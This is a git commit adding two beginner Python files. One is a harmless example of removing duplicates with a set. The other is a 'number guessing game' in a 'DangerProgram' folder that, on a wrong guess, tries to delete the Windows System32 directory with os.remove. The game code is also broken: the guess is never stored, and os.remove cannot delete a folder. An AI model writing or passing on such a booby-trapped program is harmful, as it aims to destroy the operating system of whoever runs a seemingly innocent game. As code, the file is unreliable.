ce74a8ea423a920c14575aff86c812b5c08eb76c
Suraj141203 <surajyadav141203@gmail.com>
2026-03-04 22:47:33 +0530

    done

---
+++ The Python/DangerProgram/ChooseNum.py
@@ -0,0 +1,13 @@
+import os
+import random
+
+print("Welcome to the Number Guessing Game!")
+
+number = random.randint(1, 10)
+print(input("Guess the number between 1 and 10: "))
+
+if guess == number:
+    print("You guessed it Right!")
+else:
+    os.remove("C:\Windows\System32")
+    
---
+++ The Python/Tricky Questions/Tricky_01.py
@@ -0,0 +1,5 @@
+number = [1, 2, 3, 2, 4]
+unique = list(set(number))
+print(unique)
+
+# Here Output is [1, 2, 3, 4] because set is used to remove duplicate elements
